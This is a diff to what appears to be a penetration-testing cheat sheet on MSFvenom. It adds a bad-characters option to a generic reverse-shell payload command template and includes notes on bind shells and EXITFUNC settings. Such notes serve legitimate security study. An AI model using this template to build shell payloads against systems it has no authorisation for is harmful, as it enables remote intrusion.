@@ -13,9 +13,10 @@ tags:
 # MSFvenom
 ## General Reverse Shell Format
 ```shell
-msfvenom -p <payload> LHOST=<local IP> LPORT=<local port> -f <format> -e <encoder>
+msfvenom -p <payload> LHOST=<local IP> LPORT=<local port> -f <format> -e <encoder> -b <bad chars>
 ```
 - For bind shells replace `LHOST=<local IP>` with `RHOST=<remote IP>`
+- `-b` bad chars follows format such as `"\x00\x0D"`
 - `EXITFUNC=<exit technique>`
     - `process` use where master process restarts on exit; use with multi/handler
     - `thread` *(default)*; use where shellcode runs in sub-thread; exit results in working system
